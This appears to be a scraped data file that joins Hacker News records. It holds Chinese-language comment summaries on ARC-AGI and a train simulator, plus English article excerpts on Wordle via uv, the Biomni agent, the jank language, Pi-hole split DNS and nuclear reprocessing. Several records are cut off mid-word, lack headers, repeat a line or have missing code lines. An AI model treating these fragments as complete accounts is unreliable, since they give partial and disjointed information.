• qoez：认为ARC评估测试的高分并不等同于AGI，因为该测试主要考察模式识别能力，而人类的智力有多种类型，仅仅在IQ测试中表现优异并不代表真正的聪明。
• esbranson：指出AGI并不等于意识，且AGI并不需要超人类智力。普通的10岁儿童拥有一般智力，但在这些测试中未必表现优异。同时，AGI的定义应更关注于完成人类容易完成的任务。
• TheAceOfHearts：ARC数据集的预览是一个亮点，但Chollet的观点已在其他场合重复多次。讨论中提到持续学习能力可能是构建AGI的关键因素。
• EigenLord：提到AGI与No Free Lunch Theorem的冲突，认为科学并未主导AGI的叙事，而是金钱。还质疑“人类般的智力是否真正通用”，并引用David Wolpert的工作来说明某些类型的全知智能是不可能的。
• stared：不喜欢AGI这个术语，认为 intelligence 总是涉及权衡。ARC-AGI高分并不代表通用智力，而是AI在解决一类以前无法解决的问题上取得了进展。
• modeless：将ARC-AGI与PuzzleScript游戏相比较，建议可以创建一个PuzzleScript AGI基准。
• visarga：认为智力是搜索，是探索和学习的结合，智力在于模型和环境之间的相互作用，而非单独存在于模型或环境中。
• GarnetFloride：提出AGI可能需要采取统计方法，像教孩子一样建立一个可以根据情况更新知识的系统。
• PostOnce：通过实际例子说明当前AI系统在处理简单任务时的不足，认为AGI还有很长的路要走。
• bogtog：讨论了ARC测试中的视觉特性，认为这些特性对人类容易但对LLM（大型语言模型）困难，模型在解释字符网格时表现不佳。
• kcaj：引用谈话中对智力的定义，提出一般智力的转换率问题，并质疑一般智力的定义是否是不可计算的。
• noiv：提到Bongard Problems，并对o1在此类问题上的表现表示怀疑。
• lawlessone：质疑AGI的定义，认为AGI应是 constantly aware 的，像生物大脑一样不断更新和存储记忆。
• gtech1：提出一个简单定义AGI的方法，即能回答人类无法回答的问题的系统。

补充讨论：
• 争议焦点在于ARC评估测试是否能够真正衡量AGI，特别是它是否过于侧重模式识别和特定类型的智力。
• 另一个讨论点是AGI的定义，包括是否需要持续意识和记忆更新能力。
• 还有人提出AGI可能需要具备持续学习能力和统计方法，以便在不同情况下更新知识。
• 科学与商业利益在AGI叙事中的角色也被提及，认为当前的AGI发展更多受到金钱驱动而非科学主导。

• 科学与商业利益在AGI叙事中的角色也被提及，认为当前的AGI发展更多受到金钱驱动而非科学主导。

不同观点：
• [avianlyric] 认为默认的列车停站时间过短，尤其是在高运力的系统中，停站时间是限制乘客容量的关键因素。他以伦敦维多利亚线的例子说明，30秒是较为实际的最低停站时间，并指出停站时间包括开门、关门、安全检查等多个环节，而不仅仅是乘客上下车。此外，他还提到纽约地铁使用固定闭塞系统，而非模拟中使用的移动闭塞系统，后者效率更高。

• [darthplagius] 表示自己为MTA（纽约大都会运输署）外包工作，特别是AI和创新团队，并计划将该模拟项目展示给团队，认为他们会感兴趣。

• [zerojames] 简单地对项目表示赞赏。

• [pimlottc] 指出项目的移动端体验不佳，地图控件遮挡了大部分地图，建议增加最小化控件的功能以改善移动端体验。

data.title: Solving Wordle with uv's dependency resolver
data.author: mildbyte
data.article_summary:
本文介绍了如何使用Python的依赖解析工具`uv`来解决Wordle谜题。作者之前曾用Poetry的依赖 resolver 解决过数独问题，而现在他想用更先进的`uv`工具来解决Wordle。Wordle是一个猜词游戏，玩家有六次机会猜测一个五个字母的单词，每次猜测会得到反馈：绿色表示正确字母且位置正确，黄色表示正确字母但位置错误。

作者将Wordle问题转化为Python包的依赖关系问题。每个单词表示为一个包，每个字母位置也表示为包，并通过依赖关系来约束字母的选择。通过这种方法，系统可以根据反馈逐步缩小可能的单词范围，直到找到正确答案。

文章详细描述了如何构建这种依赖关系模型，并给出了具体实现步骤和代码示例，最终展示了如何运行这个Wordle解题器。作者还提到了一些优化猜测策略的方法，并提供了GitHub链接以便读者获取完整代码。

Solving Wordle with uv's dependency resolver
7th Jul 2025
•
12 min read
•
Tags:
programming
,
tech
,
why
,
disgusting hacks
Table of Contents
Introduction
Background: Sudoku and Python dependency resolution
What is Wordle
Analysis
Basic building blocks
Greens and yellows
Python dependency rules?
Possible position packages
Feedback packages
Putting this all together: the cursed neural network
Implementation
Package examples
--find-links and wheels
Harness
Bonus round: more efficient guessing
Blooper reel
GitHub
Introduction
In a previous life, I wrote a
Sudoku solver that relied on Poetry's dependency resolver
. We ended up selling that startup to EDB (not because of the Poetry hack), which means that they now own this IP. And, since then, Python packaging has advanced, with
uv
taking the world by storm.
This means that it's time for a refresh. Can we use
uv
instead of Poetry? And can we solve a Wordle instead of a Sudoku?
For the impatient: you can get the solver from
my GitHub
. Run
uv run main.py run
and watch it go.
Background: Sudoku and Python dependency resolution
The short summary of the Sudoku + Poetry post is that unlike Rust or JavaScript, a single Python project cannot use more than one version of a specific Python package. This means that we can easily represent a Sudoku grid as 81 Python packages, each with 9 possible versions. If a certain cell has a specific number (version), cells in the same row, column and a 3x3 square it belongs to cannot have that same number.
We can encode these rules as version constraints on other packages representing our cell's neighbours.
Once we have our 81 packages, all that remains is encoding our problem by making another package, specifying the precise versions of the cells where we already have numbers, leaving the rest as wildcards, and then letting Poetry generate a lockfile that will assign each number (version) to every cell (package), thus solving the puzzle.
What is Wordle
This
is Wordle.
You have six attempts to guess a five-letter word. On each guess, you get what I'll be calling "feedback": each letter in your guess becomes green (correct letter in the correct position), yellow (correct letter, wrong position) or nothing (wrong letter).
In this post, I'll represent it as a string
YGG..
, meaning that the feedback we got for our answer is:
Yellow at position 1
Green at positions 2 and 3
Blank or "dot" at positions 4 and 5
Analysis
It is said that if you ask an LLM to think really hard about its answer and write down its thinking before giving the final response, then it can successfully count the number of r's in the word
strawberrry
and help you sell more inference tokens.
Let's do exactly that and break this down.
Basic building blocks
Let's start simple. The solution to a Wordle is a five-letter word, and we'd like our system to choose one possible word given all information that we feed into it. We can encode this as a single Python package with multiple possible versions, where each version represents a single word. This is a useful building block.
The other building block is that each position can only have one letter in it. We can easily represent this as five "position" packages, each of which can have 26 versions. If the position package 1 has version 2, that means "B" is in that position.
We can then draw dependencies between a specific version of our "word" package to specific versions of our "position" packages. If our word is
STALL
, then it'll depend on:
position package 1, version 19 (S)
position package 2, version 20 (T)
position package 3, version 1 (A)
position packages 4 and 5, version 12 (L)
Greens and yellows
However, this is not enough. We need to encode some more complex facts about the solution in Wordle than we did with Sudoku. For example, let's assume that we guessed
CHILD
and the feedback we got is
..YG.
. This means:
The fourth letter is L
The third letter is not I
But there is at least one I somewhere in the word
None of the letters are C, H or D
Is this correct though? There is a bit of nuance here.
Let's try again, this time with a different guess but the same word. We try
ATOLL
(it's not an optimal play, but as a demonstration) and get
...GY
. Here, we can't just say that there is an L somewhere in the word (because there already is). We have to say that there is at least one L in the first, second or third position.
Now let's say we guess
LILLE
and get
.GGG.
. What does this mean? Just because L in the first position gave us a dot doesn't mean there are no Ls in the word at all (there clearly are). Instead, we need to say that the first and the fifth position don't contain an L.
One thing that stems from this is that the feedback we get for a specific letter in a specific position will change based on other letters in our guess. For example, let's say the real world is
BUNNY
. If we guess
NNNON
, we'll get
YYG.Y
. And if we then guess
NNNNN
, we'll get
..GG.
. Because we discovered all Ns in the word, the first, secon

data.title: Biomni: A General-Purpose Biomedical AI Agent
data.author: GavCo
data.article_summary: Biomni是一款通用的生物医学AI代理，旨在自动执行各种生物医学研究任务，通过整合大型语言模型（LLM）推理、检索增强规划和基于代码的执行，帮助科学家大幅提高研究效率并生成可测试的假设。用户可以通过设置脚本安装Biomni，并使用自然语言执行如CRISPR筛选、单细胞RNA测序注释和化合物ADMET性质预测等任务。Biomni是一个开放科学项目，鼓励社区贡献新工具、数据集、软件和基准等。当前正开发下一代版本Biomni-E2，贡献者将有机会在顶级期刊上共同署名发表论文。Biomni基于Apache-2.0许可证发布，但某些集成工具可能有更严格的商业许可证。更多信息和使用方法可访问biomni.stanford.edu。
data.comments_summary:
主要讨论点：AI在科学研究和生物威胁领域的应用与潜力

不同观点：
• [andy99] 对LLMs（大型语言模型）在生物威胁方面的应用持怀疑态度，担心其可能提升不法分子制造生物武器的能力。他认为当前LLMs在这方面的能力有限，但仍对此表示关注。
• [freedomben] 对AI在医学研究和药物开发方面的潜力持积极态度，强调AI在发现数据模式和推动科学研究进展方面的优势，并对其在工程新药物和治疗方法上的前景感到兴奋。
• [Edmond] 认可AI在科学研究中的多种可能性，特别是构建智能工作空间来辅助科研，并提供了一个相关链接以供参考。
• [AIorNot] 对该技术在CRISPR实验室中的应用表示兴奋，并已将相关信息传递给在该领域工作的朋友。
• [SalmoShalazar] 认为尽管这类软件有其用途，但目前市场上已有太多类似产品，创新性不足，主要是在特定领域对LLM API调用进行包装，缺乏真正的技术创新。

补充讨论：
• 争议焦点在于LLMs在生物威胁方面的潜在负面影响与科学研究中的积极应用之间的平衡。一方面担心其可能被滥用，另一方面认可其在医学和科研中的巨大潜力。
• 对当前市场上类似AI软件的创新性存在质疑，指出许多新产品仅是在已有技术上进行小幅调整和专业化应用。
• 链接分享：[Edmond]提供了一个关于AI用于科学研究的智能工作空间的新闻链接，丰富了讨论的背景信息。

Biomni: A General-Purpose Biomedical AI Agent
Overview
Biomni is a general-purpose biomedical AI agent designed to autonomously execute a wide range of research tasks across diverse biomedical subfields. By integrating cutting-edge large language model (LLM) reasoning with retrieval-augmented planning and code-based execution, Biomni helps scientists dramatically enhance research productivity and generate testable hypotheses.
Quick Start
Installation
Our software environment is massive and we provide a single setup.sh script to setup.
Follow this
file
to setup the env first.
Then activate the environment E1:
conda activate biomni_e1
then install the latest biomni package:
pip install biomni --upgrade
Or install from the github source version.
Lastly, configure your API keys in bash profile
~/.bashrc
:
export
ANTHROPIC_API_KEY=
"
YOUR_API_KEY
"
export
OPENAI_API_KEY=
"
YOUR_API_KEY
"
#
optional if you just use Claude
Basic Usage
Once inside the environment, you can start using Biomni:
from
biomni
.
agent

data.article_summary: Jank是一种通用的编程语言，兼容Clojure，但通过C++和LLVM-based JIT实现，支持原生编译和最小运行时。它提供REPL开发环境，同时能够进行静态AOT编译生成原生可执行文件。Jank允许在Clojure代码中无缝嵌入C++代码，并支持多线程软件事务内存和反应代理系统。其编译器启动快、内存使用低，并提供高质量的错误报告。Jank还与Clojure生态工具（如Leiningen和nREPL）兼容，支持在同一文件中混合编写C++和Clojure代码。例子展示了如何利用Clojure强大的数据处理能力生成电影索引和转换字节大小为可读格式。

jank programming language - Clojure/LLVM/C++
The jank programming language
jank is a
general-purpose programming language
which embraces the
interactive, value-oriented
nature of Clojure as well as the desire for
native compilation and minimal runtimes
. jank is
strongly compatible with Clojure
and considers itself a dialect of Clojure. Please note that jank is under heavy development; assume all features are planned or incomplete.
Where jank differs from Clojure JVM is that its host is C++ on top of an
LLVM-based JIT
. This allows jank to offer the same benefits of
REPL-based development
while being able to
seamlessly reach into the native world
and compete seriously with JVM's performance.
Still, jank is a Clojure dialect and thus includes its
code-as-data philosophy and powerful macro system
. jank remains a functional-first language which builds upon Clojure's rich set of
persistent, immutable data structures
. When mutability is needed, jank offers a software transaction memory and reactive agent system to ensure
clean and correct multi-threaded designs
.
Current progress
Github
Sponsor
Wide spectrum dynamics
Enjoy both REPL iteration with JIT compilation and static AOT compilation to native executables.
01
Iterate like you would with Clojure
Iterate in the REPL and build your program from the ground up without leaving your editor.
(
defn
-main
[
& args
]
(
loop
[
game-state
(
new-game!
)]
(
when
(
done?
game-state
)
(
end-game!
game-state
)
(
recur
(
next-state
game-state
)))))
02
Reach into the native world
Seamlessly switch to inline C++ within your Clojure source, while still having access to your Clojure code using interpolation.
(
defn
create-vertex-shader!
[]
(
c++/glCreateShader
c++/GL_VERTEX_SHADER
))

[
shader source
]
(
let
[
shader
(
int
shader
)
source
(
str
source
)]
(

shader
1
source c++/nullptr
)))
(
defn
compile-shader!
[
shader
]
(
c++/glCompileShader
(
int
shader
)))
03
Compile to machine code
jank is built on an LLVM-based JIT. With AOT enabled, both statically and dynamically linked executables can be generated. The jank compiler itself has very speedy start times and low memory usage.
$
time
taskset
0x1
clj
hello-world.clj
hello
world
real
0m1.127s
user
0m0.997s
sys
0m0.111s
$
time
taskset
0x1
jank
run
hello-world.clj
hello
world
real
0m0.086s
user
0m0.045s
sys
0m0.040s
04
World-class errors
jank stands in its own category among lisps for its error reporting quality. No bloated JVM stack traces, opaque errors, or lack of context.
jank builds upon Clojure.
Keep your existing code; gain more confidence and more speed.
Strongly compatible with Clojure
If it works with Clojure JVM and it works with ClojureScript, it should work with jank. There's a
:jank
reader conditional for when you need it.
REPL and native JIT
Use your favorite nREPL editor plugin. jank uses an LLVM-based JIT to compile machine code on the fly.
Go native
Reach into native libraries or interact directly with your native code base. Seamlessly write both C++ and Clojure in the same file.
Tooling friendly
Leiningen, LSP, nREPL planned from the start. jank's compiler is also written with tooling in mind, so it can be used for lexing, parsing, and analysis.

All of the following examples are also valid Clojure code.

data.title: Configuring Split Horizon DNS with Pi-Hole and Tailscale
data.author: gm678
data.article_summary:
作者过去使用OpenVPN，但后来转向了基于Wireguard协议的Tailscale，因为它速度更快。Tailscale是加拿大公司，无法查看连接内容，用户也可自行托管。作者设置了Tailscale网络（tailnet），但未配置分离DNS。最初，反向代理服务器被配置为向其局域网IP发送路由。本文介绍了如何配置Pi-hole实现分离DNS：让tailnet客户端获取tailnet IP，局域网客户端获取局域网IP。

某些服务（如Nextcloud）客户端不支持额外认证，导致反向代理配置问题。作者曾通过地理封锁减少攻击面，但这限制了连接灵活性。通过在tailnet上实现分离DNS，可以避免这些问题，并有可能关闭广域网（WAN）访问，强制通过局域网或tailnet访问服务。

Pi-hole利用dnsmasq的分支pihole-FTL实现此功能，根据查询接口返回相应IP地址。这使得不同网络的客户端能获取适合其网络的地址。目前此功能仅支持IPv4。

44512470.article_content:
I've long had some form of VPN for my devices to use when I'm out and about.
Although I used to
run OpenVPN
, I moved to
Tailscale
a little while back. Tailscale builds a mesh network using
Wireguard
protocol and so is able to connect and run quite a bit faster than OpenVPN.
Side note: for those wondering, Tailscale is
Canadian
and can't see the content of connections (although if you're worried about this it's also possible to self-host using
Headscale
).
Although the tailnet has been up for some time, I hadn't got around to setting up split horizon DNS for clients on the tailnet. I was in a bit of a hurry when first setting up and so configured my reverse proxy box to advertise a route to it's own LAN IP.
This post talks about configuring my
Pi-hole
to implement a split horizon: returning the tailnet IP to tailnet clients and the LAN IP to LAN clients.
Splitting my Split Horizon
Many of the DNS names that I wanted to do this for
already
had a split horizon:
Clients on both the LAN and the wider internet connect to the same reverse proxy in my DMZ, but LAN clients connect using the proxy's local IP.
The reverse proxy fronts multiple services, most of which have authentication built in. However, it also requires that outside connections pass a separate (and valid) set of authentication credentials before it'll pass their connection on.
Having to authenticate twice is a little annoying though, and the split horizon makes it easy to disable the additional authentication when LAN clients connect:
satisfy any;
allow 192.168.3.0/24;
deny all;
auth_basic "Authenticate you must";
auth_basic_user_file /etc/nginx/wanaccess.htpasswd;
This extra authentication means that I'm not exposing any element of the backing service's authentication stack to the outside world. The underlying idea is that it
shouldn't matter
that there's an auth bypass zero day in (say) Grafana, because the wider world needs to get past my auth prompt before they can try to detect or exploit it.
You've Got Access: Why Make The Tailnet Special?
Given that there's an ability to access services via the WAN, you might be wondering why it is that I felt that I needed to do something specifically for the tailnet.
Unfortunately, the proxy
can't
enforce additional authentication for some services because those services clients don't support it.
Nextcloud
is a great example of this: the Nextcloud Desktop sync client authenticates with Nextcloud, but
It uses the
Authorization
header to present it's bearer token, so the reverse proxy will see an unexpected (and, to it, invalid) set of credentials
The client doesn't expose a way to add custom headers to the requests that it makes, so I can't simply send a shared secret and have the proxy check a different header
Having the reverse proxy require additional auth breaks off-net Nextcloud clients (and Nextcloud isn't the only service with this issue).
Geoblocking
Originally, I left the affected services accessible to the world.
Unfortunately, I
sometimes
seem to upset people enough to trigger prolonged attempts at compromising my services.
After
one such attempt
, I decided to reduce attack surface by
adding geo-blocking to my reverse proxy
, essentially restricting access to areas that I thought we'd be likely to connect from (or
at least
appear to).
This, of course, comes at a cost in flexibility, with access failing if any of the following are true:
We connected from an IP that doesn't have a location in the GeoDB (or is mislocated)
The ISP that we're connecting from does funky routing stuff and/or uses CGNAT
We've travelled somewhere that we wouldn't normally
Adding split horizon DNS to the tailnet allows me to avoid these scenarios, because the tailnet subnet can be special cased in
exactly
the same way that the LAN is.
It also increases the likelihood that I can close WAN access off and require that a client be on either the LAN or tailnet.
The Plan
The idea was that a tailnet client would also speak to the Pi-hole, but that names would resolve to a tailnet IP:
This is possible because Pi-hole is underpinned by a fork of
dnsmasq
called
pihole-FTL
which has inherited the setting
localise-queries
(in Pi-hole, this is enabled by default).
The
man page for dnsmasq
describes the setting as follows (line breaks mine):
Return answers to DNS queries from /etc/hosts and
--interface-name
and
--dynamic-host
which depend on the interface over which the query was received.
If a name has more than one address associated with it, and at least one of those addresses is on the same subnet as the interface to which the query was sent, then return only the address(es) on that subnet and return all the available addresses otherwise.
This allows for a server to have multiple addresses in /etc/hosts corresponding to each of its interfaces, and hosts will get the correct address based on which network they are attached to.
Currently this facility is limited to IPv4.

/etc/
44512470.article_summary:
作者过去使用OpenVPN，但后来转向了基于Wireguard协议的Tailscale，因为它速度更快。Tailscale是加拿大公司，无法查看连接内容，用户也可自行托管。作者设置了Tailscale网络（tailnet），但未配置分离DNS。最初，反向代理服务器被配置为向其局域网IP发送路由。本文介绍了如何配置Pi-hole实现分离DNS：让tailnet客户端获取tailnet IP，局域网客户端获取局域网IP。

某些服务（如Nextcloud）客户端不支持额外认证，导致反向代理配置问题。作者曾通过地理封锁减少攻击面，但这限制了连接灵活性。通过在tailnet上实现分离DNS，可以避免这些问题，并有可能关闭广域网（WAN）访问，强制通过局域网或tailnet访问服务。

Pi-hole利用dnsmasq的分支pihole-FTL实现此功能，根据查询接口返回相应IP地址。这使得不同网络的客户端能获取适合其网络的地址。目前此功能仅支持IPv4。

data.title: Nuclear Waste Reprocessing Gains Momentum in the U.S.
data.author: rbanffy
data.article_summary: 美国正致力于解决核废料问题。法国Orano公司在拉黑格的设施展示了通过先进技术回收和处理用过的核燃料，特别是将持久性强的放射性污泥转化为更稳定、危害较小的物质。这种方法不仅减少了核废料的体积，还降低了其长期放射性风险。研究人员利用创新化学工艺处理这些废物，目标是提高核能的可持续性和安全性，为应对气候变化提供更环保的能源选择。这一进展对全球核废料管理具有重要意义。
data.comments_summary:
主要讨论点：核燃料循环中的钚回收及其经济性和技术挑战

不同观点：
• **philipkglass** 认为，将核电站乏燃料中的钚回收制成混合氧化物（MOX）燃料在经济上不具吸引力。他指出，天然铀价格不高，且分离钚并不能显著减少废物处理成本。他还提到，美国曾因成本和进度问题取消了一个MOX燃料工厂项目，并介绍了激光浓缩技术（Silex）作为一种新的“回收”方法，旨在重新浓缩贫化铀。

• **wffurr** 以讽刺的语气回应了关于核燃料后处理的讨论，引用了一篇幽默文章来暗示核后处理中的潜在危险，称之为“无限房间”（Infinity Rooms），意指核废料存储的长久性和复杂性。

• **yk** 表达了对文章中概念混淆的困惑，指出文章有时讨论的是嬗变（将有问题的同位素转化为半衰期更短的同位素并获得能量），有时则是指回收（将乏燃料再处理成可用燃料）。这表明对不同核技术应用的混淆。

• **vavooom** 引用了维基百科，解释了从乏燃料中分离出有价值的同位素（如锶-90）的用途，包括在海洋和航空工程中的燃料应用，以及在医学中的放射治疗应用。这表明核废料中的某些同位素具有潜在的工业和医疗价值。

补充讨论：
• 经济性和成本问题是核燃料回收的一个重要争议点，特别是在美国MOX项目因成本超支和延迟而取消的背景下。
• 技术可行性和应用场景的多样性也是讨论的重点，如激光浓缩技术、嬗变技术等。
• 核废料处理中的安全性和长期管理问题引发了幽默和讽刺的回应，显示出公众对核技术复杂性的担忧。
• 某些放射性同位素在工业和医疗中的应用展示了核废料回收的潜在好处。
